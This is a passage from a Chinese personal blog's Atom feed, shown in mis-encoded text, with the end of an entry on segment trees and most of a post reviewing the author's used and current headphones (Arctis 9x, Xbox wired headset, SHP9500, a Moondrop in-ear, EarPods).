    <summary type="html">&lt;p&gt;ä¸æ ‘çŠ¶æ•°ç»„ç±»ä¼¼ï¼Œçº¿æ®µæ ‘ä¹Ÿæ˜¯ä¸€ç§ç”¨æ¥ç»´æŠ¤åŒºé—´ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥åœ¨å¯¹æ•°æ—¶é—´å¤æ‚åº¦å†…å®ç°æ›´æ–°å’ŒæŸ¥è¯¢ç­‰æ“ä½œã€‚ä½†ç›¸è¾ƒäºæ ‘çŠ¶æ•°ç»„å¤šç”¨äºå‰ç¼€å’ŒæŸ¥è¯¢ä¸åŒï¼Œçº¿æ®µæ ‘çš„åº”ç”¨èŒƒå›´æ›´ä¸ºå¹¿æ³›ï¼Œä¾‹å¦‚åŒºé—´æœ€å€¼ç­‰é—®é¢˜ï¼Œä»£ä»·æ˜¯éœ€è¦æ¶ˆè€—æ›´å¤šçš„å­˜å‚¨ç©ºé—´ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ•°æ®ç»“æ„ä¸ç®—æ³•" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="ç®—æ³•" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="æ•°æ®ç»“æ„" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>è‡ªç”¨è€³æœºç›˜ç‚¹</title>
    <link href="http://lordaeronesz.github.io/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/"/>
    <id>http://lordaeronesz.github.io/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/</id>
    <published>2024-03-12T01:03:08.000Z</published>
    <updated>2024-07-01T11:03:00.598Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å‡ ä¸ªæœˆçœ‹äº†ä¸å°‘è€³æœºç›¸å…³çš„å†…å®¹ï¼Œåˆæ­¥äº†è§£äº†ä¸€äº›è€³æœºçš„å‚æ•°æŒ‡æ ‡ä»¥åŠé€‰è´­æ–¹æ¡ˆï¼ŒåŒæ—¶ä¹Ÿç»™è‡ªå·±ä½¿ç”¨çš„è€³æœºè¿›è¡Œäº†ä¸€æ³¢æ›´æ–°æ¢ä»£ã€‚æœ¬æ–‡å°±ç®€å•ç›˜ç‚¹ä¸€ä¸‹è‡ªå·±ä¹‹å‰ç”¨è¿‡çš„å’Œç°åœ¨æ­£åœ¨ä½¿ç”¨çš„è€³æœºï¼Œå†…å®¹å®Œå…¨åŸºäºä¸ªäººçš„ä½¿ç”¨ä½“éªŒã€‚</p><span id="more"></span><h1 id="å·²é€€å½¹"><a href="#å·²é€€å½¹" class="headerlink" title="å·²é€€å½¹"></a>å·²é€€å½¹</h1><h2 id="èµ›ç¿-Arctis9x"><a href="#èµ›ç¿-Arctis9x" class="headerlink" title="èµ›ç¿ Arctis9x"></a>èµ›ç¿ Arctis9x</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9x.jpg"></p><p>ä¸»è¦æ˜¯ä¸ºäº†æ— çº¿è¿æ¥ xbox è€Œè´­å…¥ã€‚ä¹°ä¹‹å‰çœ‹äº†ä¸å°‘ç½‘ä¸Šçš„è¯„ä»·ï¼ŒåŒ…æ‹¬è§†é¢‘è¯„æµ‹ä»¥åŠ RTINGS ç½‘ç«™ä¸Šçš„æµ‹è¯•ï¼Œæ„Ÿè§‰å¾ˆä¸é”™ï¼Œä½†æ˜¯è¿™è€³æœºå¹¶æ²¡æœ‰å›½è¡Œç‰ˆæœ¬ï¼Œè€Œä¸”æµ·å¤–ç‰ˆå”®ä»·é«˜è¾¾ 200 ç¾å…ƒï¼Œå¯¹æˆ‘è€Œè¨€å®åœ¨æ˜¯å¤ªè´µï¼Œå°±åœ¨æ·˜å®èŠ± 398 è´­å…¥äº†ä¸€å‰¯æ‰€è°“çš„â€œ9æˆæ–°â€çš„â€œæ´‹åƒåœ¾â€ã€‚</p><p>å•å°±äº§å“æœ¬èº«çš„ç´ è´¨æ¥è¯´ï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚å°½ç®¡ä½œä¸ºæ¸¸æˆè€³æœºï¼Œä½†å®ƒçš„éŸ³ä¹è¡¨ç°ä¾ç„¶éå¸¸å‡ºè‰²ï¼Œä¸‰é¢‘çš„è¡¨ç°ååˆ†å‡è¡¡ã€‚å‚è€ƒ RTINGS ç½‘ç«™ä¸Šå¯¹äº 9x çš„è¯„æµ‹ï¼Œå…¶ä¸­ Neutral Sound é¡¹è¯„åˆ†é«˜è¾¾ 7.8 åˆ†å¹¶ç»™å‡ºäº† â€œsatisfactoryâ€ çš„è¯„ä»·ã€‚éº¦å…‹é£è´¨é‡ä¹Ÿç›¸å½“ä¸é”™ï¼Œè¿™æ ¹å¯ä¼¸ç¼©çš„éº¦å…‹é£è™½å°ï¼Œä½†å´æ‹¥æœ‰ä¼˜ç§€çš„æ”¶éŸ³è´¨é‡å’Œé™å™ªèƒ½åŠ›ï¼Œä¸è¿‡æˆ‘ä¹Ÿåªæ˜¯æ‹¿åˆ°æ‰‹çš„æ—¶å€™æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰æ€ä¹ˆä½¿ç”¨ã€‚ä½©æˆ´æ–¹é¢ï¼Œè€³æœºå¤´æ¢é‡‡ç”¨äº†æ¾ç´§å¸¦çš„è®¾è®¡ï¼Œä½¿å¾—ä½©æˆ´æ—¶ä¸è‡³äºå‹å¤´ã€‚è€³ç½©ä¸ç®—å¾ˆé€æ°”ï¼Œå¤å¤©ä½©æˆ´å¯èƒ½ä¼šæ¯”è¾ƒçƒ­ï¼Œä½†å¥½åœ¨ç›¸å¯¹æŸ”è½¯ï¼Œç½‘ä¸Šæ™®éè¯´èµ›ç¿ arctis  ç³»åˆ—è¿™å¥—æ¨¡å…·æ¯”è¾ƒå¤¹å¤´ï¼Œæˆ‘æ„Ÿè§‰ä¹Ÿç¨å¾®æœ‰ç‚¹ï¼Œä½†åœ¨å¯æ¥å—çš„èŒƒå›´ä¹‹å†…ã€‚æ€»ä¹‹ï¼Œä½œä¸ºæ¸¸æˆè€³æœºï¼Œæˆ‘å¯¹ 9x çš„è¡¨ç°è¿˜æ˜¯ç›¸å½“æ»¡æ„çš„ã€‚</p><p>ä½†ç”±äºæ˜¯äºŒæ‰‹äº§å“ï¼Œç”µæ± ä¸å¯é¿å…çš„æœ‰ä¸€å®šç¨‹åº¦çš„æŸè€—ï¼Œæˆ‘è¿™å‰¯çœ‹ä¸Šå»æŸè€—è¿˜æ¯”è¾ƒå¤§ï¼Œå®˜æ–¹æ ‡ç§°çš„ 20 å°æ—¶ç»­èˆªï¼Œæˆ‘å®é™…ä½¿ç”¨å¤§æ¦‚åªèƒ½æ’‘å…­ä¸ƒä¸ªå°æ—¶ã€‚å¦å¤–ï¼Œä½¿ç”¨äº†ä¸åˆ°ä¸€å¹´ä¹‹åï¼Œè¿æ¥è€³æœºå¤´æ¢å’Œå‘å£°å•å…ƒçš„è½¬è½´å°±å‡ºç°äº†æ¾åŠ¨çš„æƒ…å†µï¼Œæœ€å¼€å§‹ä¹Ÿæ²¡æ€ä¹ˆåœ¨æ„ï¼Œä½†ç»“æœæ˜¯è¶Šç”¨è¶Šæ¾ï¼Œç›´åˆ°è€³æœºå·²ç»æ— æ³•ç¨³å›ºä½©æˆ´ï¼Œæ™ƒåŠ¨è€³æœºè¿˜èƒ½å¬åˆ°æ–­è£‚çš„å¡‘æ–™ç¢ç‰‡çš„å£°éŸ³ï¼Œåº”è¯¥æ˜¯è½¬è½´å†…éƒ¨ç‰©ç†ç»“æ„çš„æŸåã€‚ä¸Šç½‘ä¸Šä¸€çœ‹ï¼ŒåŸæ¥æ˜¯æ¯”è¾ƒæ™®éçš„ç°è±¡ï¼Œå°±æŒºæ— è¯­çš„ã€‚å°è¯•åœ¨æ·˜å®æ‰¾è€³æœºç»´ä¿®ï¼Œå‘ç°ä»·æ ¼è¿˜æŒºè´µçš„ï¼Œæƒ³æƒ³è¿˜æ˜¯ç®—äº†ï¼Œåªèƒ½æ— å¥ˆå°†å…¶é€€å½¹äº†ã€‚</p><h2 id="Xbox-å®˜æ–¹æœ‰çº¿å¤´æˆ´"><a href="#Xbox-å®˜æ–¹æœ‰çº¿å¤´æˆ´" class="headerlink" title="Xbox å®˜æ–¹æœ‰çº¿å¤´æˆ´"></a>Xbox å®˜æ–¹æœ‰çº¿å¤´æˆ´</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/xbox.jpg"></p><p>9x é€€å½¹ä¹‹åï¼Œå°±æƒ³ç€æ‰¾ä¸€ä¸ªæ¥æ›¿å®ƒçš„æ¸¸æˆå¤´æˆ´ï¼Œåœ¨ä½¿ç”¨ 9x çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°æ— çº¿å¯¹æˆ‘è€Œè¨€å¥½åƒå¹¶ä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œè€Œä¸”æ— çº¿è€³æœºè¿˜å¾—æ—¶åˆ»å…³æ³¨ç”µé‡ï¼Œä»¥åŠè€ƒè™‘é•¿æœŸä½¿ç”¨åç”µæ± æŸè€—çš„é—®é¢˜ï¼Œå› æ­¤æˆ‘è¿™æ¬¡ä¸»è¦æŠŠç›®å…‰æ”¾åœ¨äº†æœ‰çº¿å¤´æˆ´ä¸Šã€‚</p><p>åœ¨é›·è›‡å™¬é­‚é²¨æœ‰çº¿å’Œ Xbox å®˜æ–¹æœ‰çº¿çš„çº ç»“ä¸­ï¼Œæˆ‘æœ€ç»ˆè¿˜æ˜¯é€‰æ‹©äº†åè€…ã€‚ç°åœ¨æƒ³æƒ³ï¼Œä¸»è¦åŸå› å¯èƒ½è¿˜æ˜¯å› ä¸º Xbox çš„å¤–è§‚è®¾è®¡æ›´åˆæˆ‘æ„ä»¥åŠæœŸå¾…å®˜æ–¹é…ä»¶çš„ç„å­¦åŠ æˆï¼ˆï¼Ÿï¼Ÿï¼‰ã€‚æ—‹é’®å¼éŸ³é‡è°ƒèŠ‚ã€å¯å¼¯æ›²æ”¶çº³çš„éº¦å…‹é£ä»¥åŠ Xbox æ ‡å¿—æ€§çš„ç»¿è‰²çº¿æå…±åŒæ„æˆäº†è¿™å‰¯è€³æœºæç®€ä¸»ä¹‰çš„è®¾è®¡ã€‚è‡³å°‘åœ¨å¤–è§‚éƒ¨åˆ†ï¼Œæˆ‘è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢çš„ã€‚</p><p>ä½†è€³æœºçš„å®é™…ä½¿ç”¨ä½“éªŒä¸èƒ½è¯´ç³Ÿç³•ï¼Œå´ä¹Ÿå¾ˆéš¾è®©äººæ»¡æ„ã€‚ä½©æˆ´æ–¹é¢ï¼Œè€³ç½©æ˜¯è›‹ç™½çš®æè´¨ï¼Œè§¦æ„Ÿè¿˜ç®— okï¼Œä¹Ÿä¸å¤¹å¤´ï¼Œä½†å¯èƒ½æ­£å› ä¸ºä¸å¤¹å¤´ï¼Œè€³æœºçš„ä½©æˆ´ç‰¢å›ºæ€§ä¸»è¦ä¾é å‹åœ¨å¤´ä¸Šçš„å¤´æ¢æ¥æä¾›ï¼Œä½©æˆ´æ—¶é—´ç¨é•¿å¤´éƒ¨å°±ä¼šæœ‰å¾ˆæ˜æ˜¾çš„ä¸é€‚æ„Ÿï¼Œå› æ­¤ä½©æˆ´æ–¹é¢çš„ä½“éªŒæ˜¯å¾ˆä¸ç†æƒ³çš„ã€‚éŸ³è´¨è¡¨ç°ä¹Ÿæ˜¯å®Œå…¨æ²¡æœ‰è¾¾åˆ°è¦æ±‚ï¼Œæ— è®ºæ˜¯é£æ ¼è¿˜æ˜¯ç´ è´¨éƒ½å’Œä¹‹å‰ä½¿ç”¨çš„ 9x æœ‰æ¯”è¾ƒæ˜æ˜¾çš„å·®è·ã€‚è°ƒéŸ³é£æ ¼ä¸Šï¼Œ9x æ•´ä½“æ˜¯åå‘ä¸­é«˜é¢‘çš„ï¼Œå¬ä¸Šå»ä¼šæ¯”è¾ƒäº®ï¼Œè€Œ Xbox æœ‰çº¿åˆ™æ˜¯åå‘äºä¸­ä½é¢‘ï¼Œå£°éŸ³éå¸¸çš„æ²‰é—·ï¼Œåˆšæ‹¿åˆ°æ‰‹å¬çš„æ—¶å€™å°±æ„Ÿè§‰éå¸¸ä¸é€‚åº”ï¼Œä¸æˆ‘çš„å¬éŸ³åå¥½å¾ˆä¸åŒ¹é…ã€‚ç´ è´¨ä¸Šæ¥è¯´ï¼Œ9x åŸºæœ¬æ˜¯å®Œçˆ† Xbox æœ‰çº¿ï¼Œæ¯•ç«ŸäºŒè€…å…¶å®æœ¬å°±ä¸æ˜¯ä¸€ä¸ªä»·ä½æ®µçš„äº§å“ï¼Œæ— è®ºæ˜¯è§£æåŠ›è¿˜æ˜¯å£°åœºï¼Œå‰è€…ç›¸æ¯”åè€…éƒ½æœ‰éå¸¸æ˜æ˜¾çš„ä¼˜åŠ¿ã€‚ä¹‹å‰æˆ‘æœ‰å¯¹æ¯”è¿‡åœ¨æ¸¸æˆã€Šè’é‡å¤§é•–å®¢1ã€‹ä¸­åŒä¸€ä¸ªåœºæ™¯äºŒè€…çš„å£°éŸ³è¡¨ç°ï¼Œç»“æœå°±æ˜¯èƒ½å¤Ÿåœ¨ 9x ä¸­å¬åˆ°çš„ä¸€äº›éå¸¸å¾®å¼±ã€å…·æœ‰æ–¹å‘æ„Ÿçš„ç¯å¢ƒå£°åœ¨ Xbox æœ‰çº¿ä¸­ä¸æ¸¸æˆçš„åœºæ™¯éŸ³ä¹æ··ä½œä¸€å›¢ï¼Œä¸¢å¤±äº†å¤§é‡ç»†èŠ‚ã€‚</p><p>æœ€ç»ˆï¼Œè¿˜æ˜¯å†³å®šæŒ‚é—²é±¼å‡ºæ‰äº†ã€‚</p><h2 id="åŸé“ç³»åˆ—"><a href="#åŸé“ç³»åˆ—" class="headerlink" title="åŸé“ç³»åˆ—"></a>åŸé“ç³»åˆ—</h2><p>ç”±äºæœ¬äººæ™šä¸Šç¡è§‰æ—¶æœ‰æ”¶å¬ç”µå°çš„ä¹ æƒ¯ï¼Œå› æ­¤ä¸€å‰¯ä»·æ ¼ä¾¿å®œã€çº¯å¬ä¸ªå“çš„åŠŸèƒ½æ€§è€³æœºå¾ˆæœ‰å¿…è¦ã€‚å› æ­¤å·ç§°å¬äº†è§¦å‘â€œæ‚”æ¨ä¹‹æ³ªâ€çš„åŸé“å°±æˆä¸ºäº†æˆ‘çš„é¦–é€‰ã€‚</p><p>åŸé“ç³»åˆ—è¿™å‡ å¹´æˆ‘ä¹Ÿé™†é™†ç»­ç»­ä¹°äº†å¥½å¤šå‰¯äº†ï¼ŒåŒ…æ‹¬æœ€æ—©æ•£è£…çš„åŸé“æ— è¿¹ï¼Œä»¥åŠåæ¥äºŒæ¬¡å…ƒå°é¢çš„åŸé“é…±ã€‚æœ€æ—©çš„æ•£è£…ç‰ˆæœ¬ç°åœ¨ä»ç„¶åœ¨å”®ï¼Œä¸è¿‡ä¸ªäººä¸å¤ªæ¨èï¼Œä¸»è¦åŸå› æ˜¯çº¿æè´¨é‡ä¸å¤ªè¡Œï¼Œæˆ‘æœ‰å¥½å‡ å‰¯éƒ½æ˜¯ç”¨äº†å‡ ä¸ªæœˆä¹‹åå‡ºç°äº†çº¿æè€åŒ–çš„æƒ…å†µï¼Œç„¶åéšä¹‹è€Œæ¥çš„å°±æ˜¯è€³æœºåªæœ‰ä¸€è¾¹å‡ºå£°ï¼Œä¸å¾—ä¸è¿›è¡Œæ›´æ¢ã€‚åé¢å‡ºçš„åŸé“é…±åœ¨çº¿æè´¨é‡ä¸Šæœ‰å¾ˆå¤§æå‡ï¼Œæˆ‘æ‰‹é‡Œè¿™æ¡é“œçº¿ç‰ˆæœ¬ç”¨äº†ä¸€å¹´å¤šä¾ç„¶æ­£å¸¸ã€‚ä¸è¿‡ä½œä¸ºæˆ‘ç¡è§‰æ—¶ä½©æˆ´çš„è€³æœºï¼Œä½©æˆ´èˆ’é€‚åº¦å¿…ç„¶ä¹Ÿè¦è€ƒè™‘å…¶ä¸­ï¼ŒåŸé“çš„è¿™æ¬¾å¹³å¤´å¡é‡‡ç”¨äº†ä¸ç»å…¸çš„æ£®æµ·å¡å°” mx500 ç›¸åŒçš„æ¨¡å…·ï¼Œå£°å­¦ç»“æ„è®¾è®¡ä¸Šå°±å¾ˆä¼˜ç§€ï¼Œå¯èƒ½è¿™ä¹Ÿæ˜¯åŸé“åœ¨å¦‚æ­¤ä½çš„ä»·ä½å…·å¤‡è¿˜ä¸é”™çš„å£°éŸ³è¡¨ç°çš„é‡è¦åŸå› ï¼Œä½†æ˜¯å…¶åœ¨ä½©æˆ´èˆ’é€‚åº¦æ–¹é¢å®åœ¨ä¸€èˆ¬ï¼Œè€³æœºè…”ä½“ä¸ç®—å°ï¼Œé•¿æ—¶é—´ä½©æˆ´çš„æƒ…å†µä¸‹èƒ½æ„Ÿè§‰åˆ°ç”±äºå¡‘æ–™è…”ä½“ä¸è€³é“ç¡¬æ¥è§¦è€Œäº§ç”Ÿçš„ç¡Œç—›æ„Ÿï¼Œæˆ´ä¸Šæµ·ç»µå¥—èƒ½ç›¸å¯¹ç¼“è§£ï¼Œä½†æµ·ç»µå¥—åˆå¾ˆå®¹æ˜“æ¾åŠ¨ï¼Œæ—¶ä¸æ—¶å°±ä¼šè„±è½ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚</p><p>åæ¥ä¹Ÿæœ‰å°è¯•è¿‡ä»–å®¶çš„ x39 å¾®åŠ¨åœˆï¼Œä½†æ˜¯ä½©æˆ´å®åœ¨ä¸ç‰¢å›ºï¼Œç¨å¾®ç¿»ä¸ªèº«å¯èƒ½å°±æ‰äº†ï¼Œå¦å¤–å…¥è€³å¼ä¹Ÿä¸é€‚åˆé•¿æ—¶é—´ä½©æˆ´ï¼Œå®¹æ˜“å‡ºç°ä¸­è€³ç‚çš„ç—‡çŠ¶ï¼Œå› æ­¤æœ€ç»ˆæ”¾å¼ƒã€‚</p><h1 id="ç°å½¹"><a href="#ç°å½¹" class="headerlink" title="ç°å½¹"></a>ç°å½¹</h1><h2 id="é£åˆ©æµ¦-SHP9500"><a href="#é£åˆ©æµ¦-SHP9500" class="headerlink" title="é£åˆ©æµ¦ SHP9500"></a>é£åˆ©æµ¦ SHP9500</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9500.jpg"></p><p>ç”±äºä¸ªäººæ‰“æ¸¸æˆè¿˜æ˜¯æ¯”è¾ƒä¹ æƒ¯å¤´æˆ´å¼è€³æœºï¼Œå› æ­¤åœ¨ä¸Šè¿°ä¸¤å¹…å¤´æˆ´éƒ½é€€å½¹ä¹‹åå°±æƒ³ç€æ‰¾ä¸€å‰¯éŸ³è´¨å‡ºè‰²ã€ä½©æˆ´èˆ’é€‚çš„æ›¿ä»£å“ã€‚åœ¨å„å¤§è®ºå›å’Œè¯„è®ºåŒºé€›äº†ä¸€æ®µæ—¶é—´ï¼Œå‘ç°äº†ä¸€ä¸ªåå¤è¢«æåˆ°çš„åå­—ï¼šé£åˆ©æµ¦ SHP9500ï¼ŒåŒæ—¶äº†è§£åˆ°è¿™æ˜¯ä¸€å‰¯å¼€æ”¾å¼å¤´æˆ´ï¼Œç”±äºæˆ‘ä¹‹å‰å¹¶æ²¡æœ‰å¬è¿‡å¼€æ”¾å¼å¤´æˆ´è€³æœºçš„å£°éŸ³ï¼Œå¯¹æ­¤æ¯”è¾ƒå¥½å¥‡ï¼ŒåŠ ä¸Šä»·æ ¼ä¹Ÿä¸ç®—é«˜ï¼Œå› æ­¤æˆ‘ä¹Ÿæ²¡æœ‰è¿‡å¤šçŠ¹è±«ï¼Œå°±åœ¨é—²é±¼èŠ± 170 å¤šæ·˜äº†ä¸€å‰¯æˆè‰²å¾ˆä¸é”™çš„ã€‚</p><p>åˆ°æ‰‹è¯•å¬äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸æ­¤å‰å¬è¿‡çš„å°é—­å¼å¤´æˆ´çš„æ„Ÿå—æˆªç„¶ä¸åŒï¼Œå£°éŸ³éå¸¸é€šé€å¹²å‡€ï¼Œå£°åœºæå…¶å¼€é˜”ï¼Œç”¨é€šä¿—çš„è¯­è¨€æ¥å½¢å®¹å°±æ˜¯ä½ èƒ½æ„Ÿå—åˆ°å„ç§ä¹å™¨çš„å£°éŸ³åˆ†å¸ƒåœ¨ä½ è€³æœµçš„ä¸åŒæ–¹ä½ï¼Œä¸´åœºæ„Ÿåè¶³ã€‚è¿™æ ·å¼€é˜”çš„å£°åœºä¹Ÿéå¸¸é€‚åˆæ¸¸ç©å¤§å‹ 3A æ¸¸æˆï¼Œèƒ½å¤Ÿå¾ˆå¤§ç¨‹åº¦ä¸Šå¢åŠ ä»£å…¥æ„Ÿã€‚ä½†æ˜¯å¼€æ”¾å¼ä¹Ÿæœ‰å¾ˆå¤§çš„å±€é™æ€§ï¼Œå°±æ˜¯ç³Ÿç³•çš„éš”éŸ³æ€§èƒ½ä»¥åŠä¸¥é‡çš„æ¼éŸ³é—®é¢˜ï¼Œè¿™ä¹Ÿæ„å‘³ç€è¿™ç±»è€³æœºçš„åŸºæœ¬åªèƒ½åœ¨æ¯”è¾ƒç§äººçš„ç©ºé—´å’Œåœºåˆä½¿ç”¨ï¼Œæ¯”è¾ƒé—æ†¾ã€‚</p><p>å¦ä¸€ä¸ªä»¤äººå°è±¡æ·±åˆ»çš„ç‚¹ä¾¿æ˜¯å®ƒçš„ä½©æˆ´ä½“éªŒï¼Œä¸ªäººä½¿ç”¨è¿‡çš„å¤´æˆ´è€³æœºä¸å¤šï¼Œ9500 ç»å¯¹æ˜¯å…¶ä¸­ä½©æˆ´æœ€ä¸ºèˆ’é€‚çš„æ— ä¹‹ä¸€ã€‚è€³æœºçš„å¯è°ƒèŠ‚èŒƒå›´å¾ˆå¤§ï¼ŒåŠ ä¸Šé€æ°”ä¸”è¶³å¤Ÿå¤§çš„è€³ç½©ï¼Œä½¿å¾—å¤§éƒ¨åˆ†äººéƒ½èƒ½é€šè¿‡ç®€å•è°ƒæ•´è·å¾—ä¸€ä¸ªæ¯”è¾ƒèˆ’é€‚çš„ä½©æˆ´æ„Ÿå—ï¼Œæ—¢ä¸å¤¹å¤´ä¹Ÿä¸å‹å¤´ï¼Œè¿ç»­ä½©æˆ´æ•°ä¸ªå°æ—¶ä¹Ÿä¸ä¼šæ„Ÿåˆ°ç–²åŠ³ã€‚</p><p>æœ€åè¦åæ§½çš„ä¸€ç‚¹å°±æ˜¯åŸè£…çº¿æè™½ç„¶è´¨æ„Ÿä¸é”™ï¼Œä½†å®åœ¨æ˜¯å¤ªé•¿äº†ï¼Œè¶³è¶³æœ‰ 3 ç±³ï¼Œæˆ‘åœ¨ä½¿ç”¨äº†ä¸€æ®µæ—¶é—´åè¿˜æ˜¯å«Œéº»çƒ¦ï¼Œè‡ªå·±ä¹°äº†ä¸€æ ¹é£åˆ©æµ¦çš„ 1.5 ç±³ç¼–åˆ¶çº¿æï¼Œåšå·¥è¿˜ç®—ä¸é”™ï¼Œä¸ 9500 æ­é…ä¹Ÿæ¯”è¾ƒåˆé€‚ã€‚</p><h2 id="æ°´æœˆé›¨-å…°"><a href="#æ°´æœˆé›¨-å…°" class="headerlink" title="æ°´æœˆé›¨ å…°"></a>æ°´æœˆé›¨ å…°</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/lan.jpg"></p><p>å…¶å®å•è®ºéŸ³è´¨ï¼Œ9500 å·²ç»å®Œå…¨èƒ½å¤Ÿæ»¡è¶³æˆ‘çš„éœ€æ±‚äº†ï¼Œä½†æ˜¯æ¯•ç«Ÿæ˜¯å¼€æ”¾å¼å¤´æˆ´ï¼Œä½¿ç”¨åœºæ™¯éå¸¸æœ‰é™ï¼Œå°±æƒ³ç€å†å…¥ä¸€å‰¯éŸ³è´¨å‡ºè‰²ã€æ–¹ä¾¿æºå¸¦ã€èƒ½å¤Ÿè®©æˆ‘å‡ºé—¨åœ¨å¤–äº«å—éŸ³ä¹çš„è€³å¡å¼è€³æœºã€‚ä½œä¸ºæˆ‘çš„å€™é€‰äº§å“çš„æœ‰ Nicehck DB2ã€å…´æˆˆ EW200ã€æ°´æœˆé›¨ ç«¹2ï¼Œä»¥åŠæˆ‘æœ€ç»ˆé€‰æ‹©äº†çš„æ°´æœˆé›¨ å…°ï¼ŒåŸå› æ— å¤–ä¹ä¸¤ç‚¹ï¼šå¹³ç›´ä¸­æ­£çš„è°ƒéŸ³å’Œä¼˜é›…çš„å¤–è§‚ã€‚</p><p>é¦–å…ˆæ˜¯éŸ³è´¨ï¼Œè´­ä¹°å‰çœ‹ç½‘ä¸Šè¯„ä»·è¯´å…°æ•´ä½“çš„è°ƒéŸ³å–å‘æ˜¯åç›‘å¬å‘çš„ï¼Œä½é¢‘ä¸å¤Ÿæœ‰åŠ›ï¼Œä½†ä¸ªäººå¹³æ—¶å¬ ACG éŸ³ä¹å¤šä¸€äº›ï¼Œä¸»è¦åå‘äºä¸­é«˜é¢‘ï¼Œå› æ­¤è°ƒéŸ³æ–¹é¢è¿˜ç®—æ¯”è¾ƒç¬¦åˆæˆ‘çš„å¬éŸ³å–å‘ã€‚æ‹¿åˆ°æ‰‹åæœç„¶å¦‚æ­¤ï¼Œå¹¶ä¸”è§£æåŠ›å¾ˆå¼ºï¼Œä¸åŒä¹å™¨ä¹‹é—´çš„åˆ†ç¦»åº¦åšå¾—éå¸¸å¥½ï¼Œé™¤äº†ç‰©ç†ç»“æ„æ‰€é™çš„å£°åœºå¤–ï¼Œæ•´ä½“å¬æ„Ÿå·²ç»å¾ˆæ¥è¿‘ 9500 äº†ï¼Œè¶³ä»¥èƒœä»»ä¸ªäººçš„ä¾¿æºéŸ³ä¹è€³æœºã€‚</p><p>ä¿ƒä½¿æˆ‘é€‰æ‹©å…°çš„ä¸€ä¸ªå¦å¤–ä¸€ä¸ªå¾ˆé‡è¦çš„åŸå› ä¾¿æ˜¯å®ƒçš„å¤–è§‚ï¼Œå½“æ—¶åœ¨äº§å“ä»‹ç»é¡µé¢ç¬¬ä¸€çœ¼çœ‹åˆ°ä¾¿å–œæ¬¢ä¸Šäº†ã€‚ä¸ä»…åœ¨äºè€³æœºè…”ä½“æç®€é£æ ¼çš„è®¾è®¡ï¼Œæ›´åœ¨äºåŸè£…çº¿æä¸å…¶å…±åŒæ­é…æ‰€è¡¨ç°å‡ºçš„ä¸€ä½“æ€§ã€‚çº¿æçš„é¢œè‰²æœ¬å°±ä¸è€³æœºæœ¬ä½“é£æ ¼å¾ˆæ­ï¼Œè¿˜åœ¨åˆ†çº¿å¤„å’Œæ’å¤´éƒ¨åˆ†ä½¿ç”¨äº†ç²‰æœ«å†¶é‡‘å·¥è‰ºï¼Œå¹¶é…ä¸Šå…°æ ‡å¿—æ€§çš„ logoï¼Œè¿›ä¸€æ­¥å¢å¼ºäº†è€³æœºçš„è´¨æ„Ÿï¼Œæ•´ä½“å¤–è§‚éå¸¸ç¬¦åˆæˆ‘çš„å®¡ç¾ã€‚</p><h2 id="è‹¹æœ-Earpods"><a href="#è‹¹æœ-Earpods" class="headerlink" title="è‹¹æœ Earpods"></a>è‹¹æœ Earpods</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/earpods.jpg"></p><p>ä¸ªäººç°å½¹çš„åŠŸèƒ½æ€§è€³æœºï¼Œä¹Ÿæ˜¯æˆ‘ç°åœ¨æ—¥å¸¸ä½¿ç”¨æœ€å¤šçš„è€³æœºã€‚</p><p>ä½œä¸ºåŠŸèƒ½æ€§è€³æœºï¼Œä½©æˆ´èˆ’é€‚åº¦å¿…ç„¶æ˜¯é¦–å…ˆéœ€è¦è€ƒè™‘çš„é—®é¢˜ï¼Œearpods åœ¨è¿™æ–¹é¢å¯è°“æ˜¯ç›¸å½“ä¼˜ç§€ã€‚è½»ç›ˆçš„é‡é‡ã€è´´è€³çš„è…”ä½“ä»¥åŠå…‰æ»‘çš„æè´¨å…±åŒé€ å°±äº†è¿‘ä¹æ— æ„Ÿçš„ä½©æˆ´ä½“éªŒï¼Œä»¥è‡³äºç›´åˆ°ä»Šå¤©ä»ç„¶æœ‰ç›¸å½“å¤šçš„å‚å•†æ¨¡ä»¿ earpods çš„å¤–è§‚è®¾è®¡ï¼Œå¯ä»¥è¯´ä»¥ä¸€å·±ä¹‹åŠ›å¼€è¾Ÿäº†åŠå…¥è€³å¼è¿™ä¸ªå…¨æ–°çš„èµ›é“ã€‚</p><p>è™½è¯´ä¸ªäººä¸»è¦æŠŠå®ƒå½“ä½œåŠŸèƒ½æ€§è€³æœºæ¥ä½¿ç”¨ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€ earpods 